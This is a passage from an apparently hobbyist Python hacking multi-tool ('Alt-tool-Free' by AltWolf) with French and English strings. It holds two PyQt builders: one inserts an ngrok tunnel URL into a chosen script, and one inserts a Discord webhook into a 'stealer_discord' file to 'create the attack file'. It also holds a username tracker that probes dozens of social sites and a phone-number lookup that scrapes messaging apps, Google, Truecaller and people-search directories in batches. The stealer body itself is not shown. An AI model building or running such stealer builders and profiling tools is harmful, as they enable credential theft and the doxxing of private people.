                threading.Thread(target=self.get_ngrok_url, daemon=True).start()

            # ---------- GET NGROK URL ----------
            def get_ngrok_url(self):
                import time
                time.sleep(3)

                try:
                    res = requests.get("http://127.0.0.1:4040/api/tunnels")
                    self.ngrok_url = res.json()['tunnels'][0]['public_url']
                    self.log.append(f"NGROK URL : {self.ngrok_url}")
                except:
                    self.log.append("Erreur récupération URL ngrok")

            # ---------- BUILD SCRIPT ----------
            def build_script(self):

                if not self.ngrok_url:
                    self.log.append("Lance ngrok d'abord")
                    return

                file_path, _ = QFileDialog.getOpenFileName(self, "Choisir script", "", "Python Files (*.py)")
                if not file_path:
                    return

                with open(file_path, "r", encoding="utf-8") as f:
                    code = f.read()

                code = code.replace("URL_NGROK_ICI", self.ngrok_url)

                desktop = os.path.join(os.path.expanduser("~"), "Desktop")
                output = os.path.join(desktop, "built_script.py")

                with open(output, "w", encoding="utf-8") as f:
                    f.write(code)

                self.log.append("Script buildé sur le bureau")

            # ---------- UPDATE LOG ----------
            def update_log(self):
                if received_data:
                    formatted = json.dumps(received_data[-1], indent=2, ensure_ascii=False)
                    self.log.append(formatted)


        # ---------------- RUN APP ----------------

        if __name__ == "__main__":
            app_qt = QApplication(sys.argv)
            window = MainWindow()
            window.show()
            sys.exit(app_qt.exec_())




if menu_choice == "10":
        os.system('cls' if os.name == 'nt' else 'clear')
        input("This Stealer is a suite of tests. To build, please select the stealer_discord file to create the attack file.")
        class MainWindow(QMainWindow):

            def __init__(self):
                super().__init__()

                self.setWindowTitle("Builder Interface")
                self.resize(500, 300)

                layout = QVBoxLayout()

                self.webhook_input = QLineEdit()
                self.webhook_input.setPlaceholderText("Entrer webhook Discord")

                self.build_btn = QPushButton("Build script")

                self.log = QTextEdit()
                self.log.setReadOnly(True)

                layout.addWidget(QLabel("Webhook Discord"))
                layout.addWidget(self.webhook_input)
                layout.addWidget(self.build_btn)
                layout.addWidget(self.log)

                container = QWidget()
                container.setLayout(layout)
                self.setCentralWidget(container)

                self.build_btn.clicked.connect(self.build_script)

            def build_script(self):

                webhook = self.webhook_input.text().strip()

                if not webhook:
                    self.log.append("Webhook manquant")
                    return

                file_path, _ = QFileDialog.getOpenFileName(self, "Choisir script", "", "Python Files (*.py)")
                if not file_path:
                    return

                with open(file_path, "r", encoding="utf-8") as f:
                    code = f.read()

                code = code.replace("WEBHOOK_URL_PLACEHOLDER", webhook)

                desktop = os.path.join(os.path.expanduser("~"), "Desktop")
                output = os.path.join(desktop, "built_script.py")

                with open(output, "w", encoding="utf-8") as f:
                    f.write(code)

                self.log.append("Script buildé avec webhook")


        if __name__ == "__main__":
            app = QApplication(sys.argv)
            window = MainWindow()
            window.show()
            sys.exit(app.exec_())














if menu_choice == "11":
            os.system('cls' if os.name == 'nt' else 'clear')
            efcm = """
             .....................           
          :*########************+++=.        ╔╗ ╔╗                                ╔╗             ╔╗
        .-#############***********+++.       ║║ ║║                               ╔╝╚╗            ║║
        .-%#:.....................-+*:       ║║ ║║╔══╗╔══╗╔═╗╔═╗ ╔══╗ ╔╗╔╗╔══╗   ╚╗╔╝╔═╗╔══╗ ╔══╗║║╔╗╔══╗╔═╗
        .-%*.                     :+*:       ║║ ║║║══╣║╔╗║║╔╝║╔╗╗╚ ╗║ ║╚╝║║╔╗║    ║║ ║╔╝╚ ╗║ ║╔═╝║╚╝╝║╔╗║║╔╝
        .-%*.                     :+*:       ║╚═╝║╠══║║║═╣║║ ║║║║║╚╝╚╗║║║║║║═╣    ║╚╗║║ ║╚╝╚╗║╚═╗║╔╗╗║║═╣║║
      .-=-:-.   .::-======--:..   .:::::.    ╚═══╝╚══╝╚══╝╚╝ ╚╝╚╝╚═══╝╚╩╩╝╚══╝    ╚═╝╚╝ ╚═══╝╚══╝╚╝╚╝╚══╝╚╝ 
     .%%%%#. .:+#%##########***=.. :+**+=.   
    .=%%%%%+.+%%%%%%%##########**-.=*****:.                 Username Tracker By AltWolf
   .%%%%%%%*=%%%%%%%%%%%##########-+******=                         Version free
   .%%%%%%%+#%%%%%%%%%############=+******=. 
    .-+=:..:+%#%#+---+%%#+---+##*#-...:--:.  
            :#%*.    -#%*:    .+#+.               
            .-%*.  .=#%%%#-.  .*#-                        
    .-=-:..::*%%%##%%%%#%%%%**%%%+:...:--:.  
   .%%%%%%%#=%%%%%%%%%+.+%%%%%%%%%-*%%%%%%+. 
   .%%%%%%%%=#%%%%%%%%#*#%%%%%%%%++%%%%%%%+. 
    .+%%%%%*....:=%%%%%%%%%%#-... .*%%%%%-.  
     :%@%%%:     -%%%%%%%%%%*:     -%%%%#.   
      :+*+:-.    .:-+*#***=-.     :::=+=.    
        .=%%.                     :%%:.      
        .+@%.                     :%%-       
        .+@%:.....................=%%-       
        .+@@@@@@@@@@@%%%%%%%%%%%%%%%%-       
        .+@@@@@@@@@@@%%%%%%%%%%%%%%%%-       
        .=@@@@@@@@@%%%%%%%%%%%%%%%%%%:       
         .=@@@@@@@@@@@@@@@@@@@@%%%%#-. 
            """
            print_violet_white_gradient(efcm)
            def search_username(username):
                profiles = {}
                social_media = {
                    "Instagram": f"https://www.instagram.com/{username}",
                    "Twitter": f"https://twitter.com/{username}",
                    "TikTok": f"https://www.tiktok.com/@{username}",
                    "YouTube": f"https://www.youtube.com/@{username}",
                    "Facebook": f"https://www.facebook.com/{username}",
                    "Twitch": f"https://www.twitch.tv/{username}",
                    "Snapchat": f"https://www.snapchat.com/add/{username}",
                    "Discord": f"https://discord.com/users/{username}",
                    "Steam": f"https://steamcommunity.com/id/{username}",
                    "Xbox Live": f"https://account.xbox.com/en-US/Profile?GamerTag={username}",
                    "PlayStation": f"https://psnprofiles.com/{username}",
                    "Reddit": f"https://www.reddit.com/user/{username}",
                    "LinkedIn": f"https://www.linkedin.com/in/{username}",
                    "GitHub": f"https://github.com/{username}",
                    "Pinterest": f"https://www.pinterest.com/{username}",
                    "Telegram": f"https://t.me/{username}",
                    "Tumblr": f"https://{username}.tumblr.com",
                    "Spotify": f"https://open.spotify.com/user/{username}",
                    "SoundCloud": f"https://soundcloud.com/{username}",
                    "Medium": f"https://medium.com/@{username}",
                    "Patreon": f"https://www.patreon.com/{username}",
                    "Roblox": f"https://www.roblox.com/users/profile?username={username}",
                    "Fortnite": f"https://fortnitetracker.com/profile/all/{username}",
                    "Vimeo": f"https://vimeo.com/{username}",
                    "Flickr": f"https://www.flickr.com/people/{username}",
                    "DeviantArt": f"https://www.deviantart.com/{username}",
                    "Dribbble": f"https://dribbble.com/{username}",
                    "Behance": f"https://www.behance.net/{username}",
                    "Keybase": f"https://keybase.io/{username}",
                    "HackerOne": f"https://hackerone.com/{username}",
                    "Codecademy": f"https://www.codecademy.com/profiles/{username}",
                    "About.me": f"https://about.me/{username}",
                    "Badoo": f"https://badoo.com/@{username}",
                    "Meetup": f"https://www.meetup.com/members/{username}",
                    "Slack": f"https://{username}.slack.com",
                    "Blogger": f"https://{username}.blogspot.com"
                }

                print(f"Searching for username: {username}")
                print("This may take a moment...\n")

                for platform, url in social_media.items():
                    try:
                        response = requests.get(url, timeout=5)
                        if response.status_code == 200:
                            profiles[platform] = url
                            print(f"[+] Found: {platform}")
                    except:
                        pass

                return profiles

            def display_results(profiles):
                print("\n" + "="*50)
                if not profiles:
                    print("No profiles found.")
                else:
                    print(f"Found {len(profiles)} profile(s):\n")
                    for platform, url in profiles.items():
                        print(f"    {platform}: {url}")
                print("="*50)

            if __name__ == "__main__":
                username = input("Enter username to search: ")
                profiles = search_username(username)
                display_results(profiles)
                
                input("\nPress enter to continue...")
                time.sleep(1)
                os.system("python Alt-tool-Free.py")




if menu_choice == "12":
    os.system('cls' if os.name == 'nt' else 'clear')
    #!/usr/bin/env python3
    from urllib.parse import quote
    from bs4 import BeautifulSoup

    class SocialMediaPhoneLookup:
        def __init__(self):
            self.results = []
            self.session = requests.Session()
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            })
            
            
            self.country_codes = {
                '+33': {'name': 'France', 'flag': 'FR', 'length': 11},
                '+44': {'name': 'United Kingdom', 'flag': 'UK', 'length': 12},
                '+1': {'name': 'USA/Canada', 'flag': 'US', 'length': 11},
                '+61': {'name': 'Australia', 'flag': 'AU', 'length': 11},
                '+49': {'name': 'Germany', 'flag': 'DE', 'length': 12},
                '+34': {'name': 'Spain', 'flag': 'ES', 'length': 11},
                '+39': {'name': 'Italy', 'flag': 'IT', 'length': 12},
                '+91': {'name': 'India', 'flag': 'IN', 'length': 12},
                '+86': {'name': 'China', 'flag': 'CN', 'length': 13},
                '+81': {'name': 'Japan', 'flag': 'JP', 'length': 12},
                '+82': {'name': 'South Korea', 'flag': 'KR', 'length': 12},
                '+7': {'name': 'Russia', 'flag': 'RU', 'length': 11},
                '+55': {'name': 'Brazil', 'flag': 'BR', 'length': 13},
                '+52': {'name': 'Mexico', 'flag': 'MX', 'length': 12},
                '+27': {'name': 'South Africa', 'flag': 'ZA', 'length': 11},
                '+971': {'name': 'UAE', 'flag': 'AE', 'length': 12},
                '+966': {'name': 'Saudi Arabia', 'flag': 'SA', 'length': 12},
                '+31': {'name': 'Netherlands', 'flag': 'NL', 'length': 11},
                '+32': {'name': 'Belgium', 'flag': 'BE', 'length': 11},
                '+41': {'name': 'Switzerland', 'flag': 'CH', 'length': 11},
                '+46': {'name': 'Sweden', 'flag': 'SE', 'length': 11},
                '+47': {'name': 'Norway', 'flag': 'NO', 'length': 10},
                '+45': {'name': 'Denmark', 'flag': 'DK', 'length': 10},
                '+48': {'name': 'Poland', 'flag': 'PL', 'length': 11},
                '+351': {'name': 'Portugal', 'flag': 'PT', 'length': 12},
                '+30': {'name': 'Greece', 'flag': 'GR', 'length': 12},
                '+90': {'name': 'Turkey', 'flag': 'TR', 'length': 12},
            }
            
            self.platforms = {
                "WhatsApp": {"icon": "[WA]", "method": "check_whatsapp"},
                "Telegram": {"icon": "[TG]", "method": "check_telegram"},
                "Signal": {"icon": "[SG]", "method": "check_signal"},
                "Viber": {"icon": "[VB]", "method": "check_viber"},
                "Facebook": {"icon": "[FB]", "method": "check_facebook"},
                "Instagram": {"icon": "[IG]", "method": "check_instagram"},
                "Snapchat": {"icon": "[SC]", "method": "check_snapchat"},
                "Twitter/X": {"icon": "[TW]", "method": "check_twitter"},
                "LinkedIn": {"icon": "[LI]", "method": "check_linkedin"},
                "TikTok": {"icon": "[TK]", "method": "check_tiktok"},
                "Discord": {"icon": "[DC]", "method": "check_discord"},
                "Skype": {"icon": "[SK]", "method": "check_skype"},
                "WeChat": {"icon": "[WC]", "method": "check_wechat"},
                "Line": {"icon": "[LN]", "method": "check_line"},
                "Messenger": {"icon": "[MS]", "method": "check_messenger"},
                "Truecaller": {"icon": "[TC]", "method": "check_truecaller"},
                "Pinterest": {"icon": "[PT]", "method": "check_pinterest"},
                "Reddit": {"icon": "[RD]", "method": "check_reddit"},
                "Tumblr": {"icon": "[TB]", "method": "check_tumblr"},
                "VK": {"icon": "[VK]", "method": "check_vk"},
                "Google Search": {"icon": "[GG]", "method": "check_google_deep"},
            }
            
            
            self.uk_directories = {
                "192.com": "https://www.192.com/",
                "BT Phone Book": "https://www.thephonebook.bt.com/",
                "Yell": "https://www.yell.com/",
            }
            
            
            self.us_directories = {
                "Whitepages": "https://www.whitepages.com/",
                "Spokeo": "https://www.spokeo.com/",
                "TruePeopleSearch": "https://www.truepeoplesearch.com/",
            }
        
        def detect_country(self, phone):
            for code, info in sorted(self.country_codes.items(), key=lambda x: len(x[0]), reverse=True):
                if phone.startswith(code):
                    return code, info
            return None, None
        
        def clean_phone(self, phone):
            
            cleaned = re.sub(r'[^\d+]', '', phone)
            
            
            if not cleaned.startswith('+'):
                
                if cleaned.startswith('07') and len(cleaned) == 11:
                    cleaned = '+44' + cleaned[1:]
                elif cleaned.startswith('447') and len(cleaned) == 12:
                    cleaned = '+' + cleaned
                
                elif len(cleaned) == 10 and not cleaned.startswith('0'):
                    cleaned = '+1' + cleaned
                elif cleaned.startswith('1') and len(cleaned) == 11:
                    cleaned = '+' + cleaned
                
                elif cleaned.startswith('0') and len(cleaned) == 10:
                    cleaned = '+33' + cleaned[1:]
                elif cleaned.startswith('33') and len(cleaned) == 11:
                    cleaned = '+' + cleaned
                
                elif cleaned.startswith('04') and len(cleaned) == 10:
                    cleaned = '+61' + cleaned[1:]
                elif cleaned.startswith('61') and len(cleaned) == 11:
                    cleaned = '+' + cleaned
                
                else:
                    
                    for code in sorted(self.country_codes.keys(), key=lambda x: len(x), reverse=True):
                        code_digits = code.replace('+', '')
                        if cleaned.startswith(code_digits):
                            cleaned = '+' + cleaned
                            break
                    else:
                        
                        if cleaned.startswith('0'):
                            cleaned = '+33' + cleaned[1:]
                        else:
                            cleaned = '+33' + cleaned
            
            return cleaned
        
        def validate_phone(self, phone):
            code, info = self.detect_country(phone)
            
            if not code:
                return False, "Unknown country code"
            
            
            if len(phone) < 10 or len(phone) > 16:
                return False, f"Invalid length for {info['name']}"
            
            return True, f"{info['flag']} {info['name']}"
        
        def parse_google_results(self, html, phone):
            try:
                soup = BeautifulSoup(html, 'html.parser')
                
                
                results = soup.find_all('div', class_='g')
                
                found_platforms = []
                found_links = []
                
                for result in results[:10]:  
                    text = result.get_text().lower()
                    links = result.find_all('a', href=True)
                    
                    
                    platforms_keywords = {
                        'facebook': ['facebook.com', 'fb.com'],
                        'instagram': ['instagram.com'],
                        'twitter': ['twitter.com', 'x.com'],
                        'linkedin': ['linkedin.com'],
                        'tiktok': ['tiktok.com'],
                        'snapchat': ['snapchat.com'],
                        'telegram': ['t.me', 'telegram'],
                        'whatsapp': ['wa.me', 'whatsapp'],
                        'viber': ['viber.com'],
                    }
                    
                    for platform, keywords in platforms_keywords.items():
                        for keyword in keywords:
                            if keyword in text:
                                found_platforms.append(platform.capitalize())
                                
                                for link in links:
                                    href = link.get('href', '')
                                    if keyword in href and phone.replace('+', '') in href:
                                        found_links.append((platform, href))
                
                return list(set(found_platforms)), found_links
                
            except:
                
                text = html.lower()
                found_platforms = []
                
                platforms = {
                    'facebook': ['facebook.com', 'fb.com'],
                    'instagram': ['instagram.com'],
                    'twitter': ['twitter.com', 'x.com'],
                    'linkedin': ['linkedin.com'],
                    'tiktok': ['tiktok.com'],
                    'telegram': ['t.me', 'telegram.org'],
                    'whatsapp': ['wa.me', 'whatsapp.com'],
                }
                
                for platform, keywords in platforms.items():
                    for keyword in keywords:
                        if keyword in text and phone.replace('+', '').replace(' ', '') in text:
                            found_platforms.append(platform.capitalize())
                            break
                
                return list(set(found_platforms)), []
        
        def check_whatsapp(self, phone):
            try:
                clean = phone.replace('+', '').replace(' ', '')
                
                
                url = f"https://api.whatsapp.com/send?phone={clean}"
                response = self.session.head(url, timeout=8, allow_redirects=False)
                
                if response.status_code in [200, 302]:
                    return "[OK] Account found", f"https://wa.me/{clean}"
                
                
                check_url = f"https://web.whatsapp.com/send?phone={clean}"
                response2 = self.session.get(check_url, timeout=8)
                
                if "The phone number shared via url is invalid" not in response2.text:
                    return "[OK] Likely on WhatsApp", f"https://wa.me/{clean}"
                
                return "[--] Not found", None
            except Exception as e:
                return f"[!!] Error: {str(e)[:30]}", None
        
        def check_telegram(self, phone):
            try:
                clean = phone.replace('+', '').replace(' ', '')
                
                url = f"https://t.me/{clean}"
                response = self.session.get(url, timeout=8)
                
                if "tgme_page" in response.text or "telegram.me" in response.text:
                    return "[OK] Profile found", url
                
                return "[--] Not found", None
            except Exception as e:
                return "[!!] Error", None
        
        def check_signal(self, phone):
            return "[--] No public lookup (E2E)", None
        
        def check_viber(self, phone):
            return self.google_search_deep(f"viber {phone}", "Viber")
        
        def check_facebook(self, phone):
            return self.google_search_deep(f"site:facebook.com {phone}", "Facebook")
        
        def check_instagram(self, phone):
            return self.google_search_deep(f"site:instagram.com {phone}", "Instagram")
        
        def check_snapchat(self, phone):
            return self.google_search_deep(f"snapchat {phone}", "Snapchat")
        
        def check_twitter(self, phone):
            return self.google_search_deep(f"site:twitter.com OR site:x.com {phone}", "Twitter/X")
        
        def check_linkedin(self, phone):
            return self.google_search_deep(f"site:linkedin.com {phone}", "LinkedIn")
        
        def check_tiktok(self, phone):
            return self.google_search_deep(f"site:tiktok.com {phone}", "TikTok")
        
        def check_discord(self, phone):
            return self.google_search_deep(f"discord {phone}", "Discord")
        
        def check_skype(self, phone):
            try:
                clean = phone.replace('+', '').replace(' ', '')
                url = f"https://www.skype.com/en/search/?q={clean}"
                response = self.session.get(url, timeout=8)
                
                if response.status_code == 200 and "result" in response.text.lower():
                    return "[OK] Results available", url
                
                return "[--] Not found", None
            except:
                return "[!!] Error", None
        
        def check_wechat(self, phone):
            return self.google_search_deep(f"wechat {phone}", "WeChat")
        def check_line(self, phone):
            return self.google_search_deep(f"line {phone}", "Line")
        def check_messenger(self, phone):
            return self.google_search_deep(f"site:messenger.com OR site:m.me {phone}", "Messenger")
        
        def check_truecaller(self, phone):
            try:
                clean = phone.replace(' ', '')
                
                code, info = self.detect_country(clean)
                region = 'us'  
                
                if code == '+44':
                    region = 'uk'
                elif code == '+33':
                    region = 'fr'
                elif code == '+61':
                    region = 'au'
                elif code == '+91':
                    region = 'in'
                
                url = f"https://www.truecaller.com/search/{region}/{quote(clean)}"
                
                response = self.session.get(url, timeout=8)
                
                if response.status_code == 200:
                    text = response.text.lower()
                    if "name" in text or "profile" in text or "owner" in text:
                        return "[OK] Information available", url
                    else:
                        return "[--] Not found", None
                
                return "[--] Not found", None
            except:
                return "[!!] Error", None
        
        def check_pinterest(self, phone):
           
            return self.google_search_deep(f"site:pinterest.com {phone}", "Pinterest")
        
        def check_reddit(self, phone):
        
            return self.google_search_deep(f"site:reddit.com {phone}", "Reddit")
        
        def check_tumblr(self, phone):
        
            return self.google_search_deep(f"site:tumblr.com {phone}", "Tumblr")
        
        def check_vk(self, phone):

            try:
                search_url = f"https://vk.com/search?c[q]={quote(phone)}"
                response = self.session.get(search_url, timeout=8)
                
                if response.status_code == 200:
                    text = response.text.lower()
                    if "result" in text or "user" in text or "profile" in text:
                        return "[OK] Results found", search_url
                
                return "[--] Not found", None
            except:
                return "[!!] Error", None
        
        def check_uk_directories(self, phone):
            if not phone.startswith('+44'):
                return "N/A - Not UK number", None
            
            try:
                
                uk_format = '0' + phone[3:]
                
                
                url = f"https://www.192.com/people/search/?s={quote(uk_format)}"
                response = self.session.get(url, timeout=8)
                
                if response.status_code == 200 and "result" in response.text.lower():
                    return "[OK] Found in UK directory", url
                
                return "[--] Not in UK directories", None
            except:
                return "[!!] Error", None
        
        def check_us_directories(self, phone):
            if not phone.startswith('+1'):
                return "N/A - Not US/CA number", None
            
            try:
                
                clean = phone[2:]  
                formatted = f"({clean[:3]}) {clean[3:6]}-{clean[6:]}"
                
                
                url = f"https://www.whitepages.com/phone/{quote(clean)}"
                response = self.session.get(url, timeout=8)
                
                if response.status_code == 200:
                    text = response.text.lower()
                    if "owner" in text or "name" in text or "location" in text:
                        return "[OK] Found in US directory", url
                
                return "[--] Not in US directories", None
            except:
                return "[!!] Error", None
        
        def google_search_deep(self, query, platform_name):
            try:
                url = f"https://www.google.com/search?q={quote(query)}&num=20"
                response = self.session.get(url, timeout=10)
                
                if response.status_code == 200:
                    text = response.text.lower()
                    
                    
                    if "did not match any documents" in text or "no results found" in text:
                        return "[--] No results on Google", None
                    
                    
                    if 'id="result-stats"' in text or 'class="result-stats"' in text:
                        
                        platforms, links = self.parse_google_results(response.text, query.split()[-1])
                        
                        if links:
                            link_url = links[0][1] if links else url
                            return f"[OK] Found on Google (verified)", link_url
                        elif platforms and platform_name.lower().replace('/', '').replace(' ', '') in ' '.join(platforms).lower().replace('/', '').replace(' ', ''):
                            return f"[!!] Mentions on Google", url
                        elif "result" in text[:5000]:
                            return f"[!!] Possible results on Google", url
                        else:
                            return "[--] No relevant results", None
                    else:
                        return "[--] No results", None
                
                return "[!!] Search failed", None
            except Exception as e:
                return f"[!!] Google error", None
        
        def check_google_deep(self, phone):
            try:
                clean = phone.replace(' ', '')
                query = f'"{clean}"'
                
                url = f"https://www.google.com/search?q={quote(query)}&num=30"
                response = self.session.get(url, timeout=10)
                
                if response.status_code == 200:
                    text = response.text.lower()
                    
                    if "did not match any documents" in text:
                        return "[--] No Google results", None
                    
                    
                    platforms, links = self.parse_google_results(response.text, clean)
                    
                    if platforms:
                        platforms_str = ", ".join(list(set(platforms))[:5])
                        return f"[OK] Found on: {platforms_str}", url
                    elif "result" in text:
                        return "[!!] Some results found", url
                    else:
                        return "[--] No results", None
                
                return "[--] No results", None
            except Exception as e:
                return f"[!!] Error: {str(e)[:20]}", None
        
        def scan_all_platforms(self, phone):
            cleaned_phone = self.clean_phone(phone)
            is_valid, country_info = self.validate_phone(cleaned_phone)
            print(f"SCAN FOR NUMBER: {cleaned_phone}")
            if is_valid:
                print(f"Detected Country: {country_info}")
            else:
                print(f"Warning: {country_info}")
            print(f"\nChecking {len(self.platforms)} platforms with real verification...\n")
            print("This scan takes 2-3 minutes to avoid rate limiting\n")
            
            results = []
            found_count = 0
            warning_count = 0
            
            
            extended_platforms = dict(self.platforms)
            
            code, info = self.detect_country(cleaned_phone)
            if code == '+44':
                extended_platforms["UK Directories"] = {"icon": "[UK]", "method": "check_uk_directories"}
            elif code == '+1':
                extended_platforms["US Directories"] = {"icon": "[US]", "method": "check_us_directories"}
            
            for i, (platform, config) in enumerate(extended_platforms.items(), 1):
                print(f"[{i:2}/{len(extended_platforms)}] {config['icon']} {platform:<20}", end=" ", flush=True)
                
                try:
                    method = getattr(self, config['method'])
                    status, url = method(cleaned_phone)
                    
                    print(f"{status}")
                    
                    result = {
                        "platform": platform,
                        "status": status,
                        "url": url,
                        "icon": config['icon']
                    }
                    
                    results.append(result)
                    
                    if "[OK]" in status:
                        found_count += 1
                    elif "[!!]" in status and url:
                        warning_count += 1
                    
                    
                    time.sleep(2.5)
                    
                except Exception as e:
                    print(f"[!!] Error: {str(e)[:30]}")
                    results.append({
                        "platform": platform,
                        "status": f"[!!] Error: {str(e)[:30]}",
                        "url": None,
                        "icon": config['icon']
                    })
            
            
            print(f"\n[OK] Found with certainty    : {found_count} platform(s)")
            print(f"[!!] Needs manual check      : {warning_count} platform(s)")
            print(f"[--] Not found               : {len(results) - found_count - warning_count} platform(s)")
            
            
            certain_findings = [r for r in results if "[OK]" in r['status']]
            if certain_findings:
                print("\n[OK] ACCOUNTS FOUND (VERIFIED):")
                print("-"*80)
                for r in certain_findings:
                    print(f"  {r['icon']} {r['platform']:<20} {r['status']}")
                    if r['url']:
                        print(f"      >> {r['url']}")
            
            
            manual_check = [r for r in results if "[!!]" in r['status'] and r['url']]
            if manual_check:
                print("\n[!!] MANUAL VERIFICATION NEEDED:")
                print("-"*80)
                for r in manual_check:
                    print(f"  {r['icon']} {r['platform']:<20}")
                    print(f"      >> {r['url']}")
            
            
            print("\nTIPS:")
            print("-"*80)
            print("  - Click on '>>' links to manually verify")
            print("  - Some platforms require login to see full results")
            print("  - Google results may contain false positives")
            print("  - Use multiple sources to confirm findings")
            print(f"  - Country detected: {country_info if is_valid else 'Unknown'}")
            
            
            scan_result = {
                "phone": cleaned_phone,
                "country": country_info if is_valid else "Unknown",
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "found_count": found_count,
                "warning_count": warning_count,
                "results": results
            }
            self.results.append(scan_result)
            
            return scan_result
        
        def export_results(self, filename="phone_scan_results.json"):
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(self.results, f, indent=2, ensure_ascii=False)
                print(f"\n[OK] Results exported to: {filename}")
            except Exception as e:
                print(f"\n[!!] Export error: {e}")
        
        def export_html_report(self, filename="phone_scan_report.html"):
            if not self.results:
                print("[!!] No results to export")
                return
            
            html = """<!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Phone Lookup Report - International</title>
        <style>
            body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
            .container { max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); }
            h1 { color: #333; text-align: center; margin-bottom: 30px; font-size: 2.5em; }
            .scan { margin: 30px 0; border: 2px solid #e0e0e0; padding: 25px; border-radius: 10px; background: #fafafa; }
            .scan h2 { color: #667eea; margin-top: 0; }
            .country-badge { display: inline-block; padding: 5px 15px; background: #f0f0f0; border-radius: 20px; font-size: 0.9em; margin-left: 10px; }
            .stats { display: flex; gap: 20px; margin: 20px 0; }
            .stat-box { flex: 1; padding: 15px; border-radius: 8px; text-align: center; }
            .stat-box.found { background: #d4edda; color: #155724; }
            .stat-box.warning { background: #fff3cd; color: #856404; }
            .stat-box.notfound { background: #f8d7da; color: #721c24; }
            .stat-box .number { font-size: 2em; font-weight: bold; }
            .platform { margin: 15px 0; padding: 15px; background: white; border-left: 4px solid #ddd; border-radius: 5px; transition: all 0.3s; }
            .platform:hover { box-shadow: 0 4px 12px rgba(0,0,0,0.1); transform: translateX(5px); }
            .platform.found { border-left-color: #28a745; }
            .platform.warning { border-left-color: #ffc107; }
            .platform.notfound { border-left-color: #dc3545; }
            a { color: #667eea; text-decoration: none; font-weight: 500; }
            a:hover { text-decoration: underline; }
            .timestamp { color: #666; font-size: 0.9em; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Phone Lookup Report - International</h1>
    """
            
            for scan in self.results:
                html += f"""
            <div class="scan">
                <h2>Phone Number: {scan['phone']}<span class="country-badge">{scan.get('country', 'Unknown')}</span></h2>
                <p class="timestamp">Scan Date: {scan['timestamp']}</p>
                <div class="stats">
                    <div class="stat-box found">
                        <div class="number">{scan['found_count']}</div>
                        <div>[OK] Found</div>
                    </div>
                    <div class="stat-box warning">
                        <div class="number">{scan['warning_count']}</div>
                        <div>[!!] To Verify</div>
                    </div>
                    <div class="stat-box notfound">
                        <div class="number">{len(scan['results']) - scan['found_count'] - scan['warning_count']}</div>
                        <div>[--] Not Found</div>
                    </div>
                </div>
                <hr>
    """
                for r in scan['results']:
                    css_class = "found" if "[OK]" in r['status'] else ("warning" if "[!!]" in r['status'] else "notfound")
                    url_link = f'<a href="{r["url"]}" target="_blank">View Link</a>' if r['url'] else ""
                    html += f"""
                <div class="platform {css_class}">
                    <span style="font-size: 1.2em;">{r['icon']} <strong>{r['platform']}</strong></span>
                    <span style="margin-left: 15px;">{r['status']}</span>
                    {f'<div style="margin-top: 10px;">{url_link}</div>' if url_link else ''}
                </div>
    """
                html += """
            </div>
    """
            
            html += """
        </div>
    </body>
    </html>
    """
            
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(html)
                print(f"\n[OK] HTML report exported to: {filename}")
            except Exception as e:
                print(f"\n[!!] HTML export error: {e}")
        
        def show_history(self):
            print("\n" + "="*80)
            print("SCAN HISTORY")
            
            if not self.results:
                print("\n[--] No scans performed yet")
                return
            
            for i, scan in enumerate(self.results, 1):
                print(f"\n{i}. {scan['timestamp']}")
                print(f"    Number: {scan['phone']}")
                print(f"    Country: {scan.get('country', 'Unknown')}")
                print(f"    [OK] Found: {scan['found_count']} | [!!] To verify: {scan['warning_count']}")
        
        def show_supported_countries(self):
            print("\n" + "="*80)
            print("SUPPORTED COUNTRIES")
            print("="*80)
            print("\nThe script automatically detects and supports:")
            print()
            
            for code, info in sorted(self.country_codes.items(), key=lambda x: x[1]['name']):
                print(f"  [{info['flag']}] {info['name']:<25} ({code})")
            
            print(f"\nTotal: {len(self.country_codes)} countries supported")
            print("\nTIP: Enter numbers in any format:")
            print("  - International: +44 7700 900000")
            print("  - National: 07700 900000 (UK)")
            print("  - National: 0612345678 (France)")
            print("  - National: (555) 123-4567 (USA)")

    def main():
        scanner = SocialMediaPhoneLookup()
        phon = """
    =#############=   
    -%%%%%%%%%%%%%%%:  
    -:              :  
    -:              :  
    -:              :  
    -:              :  
    -:              :  Phone-Lookup By AltWolf
    -:              :      Version V2.0.0
    -:              :    INTERNATIONAL EDITION
    -:              :  
    -:              :  
    -:              :  
    -:              :  
    -:              :  
    -:              :  
    -%%%%%%%%%%%%%%%:  
    +%%%%%%%%%%%%%*  
        """
        print_violet_white_gradient(phon)
        
        while True:
            print("\nMAIN MENU - INTERNATIONAL")
            print("-"*80)
            print("1. Scan a phone number (full scan)")
            print("2. Batch scan (multiple numbers)")
            print("3. Show scan history")
            print("4. Export results (JSON)")
            print("5. Export HTML report")
            print("6. List supported platforms")
            print("7. List supported countries")
            print("0. Exit")
            print("-"*80)
            
            choice = input("Your choice: ").strip()
            
            if choice == "1":
                phone = input("\nEnter phone number (any format): ").strip()
                if phone:
                    print("\nScan will take 2-3 minutes for thorough verification...")
                    scanner.scan_all_platforms(phone)
                else:
                    print("[!!] Empty number")
            
            elif choice == "2":
                print("\nEnter phone numbers (one per line, empty line to finish):")
                phones = []
                while True:
                    phone = input("  > ").strip()
                    if not phone:
                        break
                    phones.append(phone)
                
                if phones:
                    for idx, phone in enumerate(phones, 1):
                        print(f"\n{'='*80}")
                        print(f"Scanning {idx}/{len(phones)}")
                        scanner.scan_all_platforms(phone)
                        if idx < len(phones):
                            print("\n5 second pause before next scan...")
                            time.sleep(5)
                else:
                    print("[!!] No numbers entered")
            
            elif choice == "3":
                scanner.show_history()
            
            elif choice == "4":
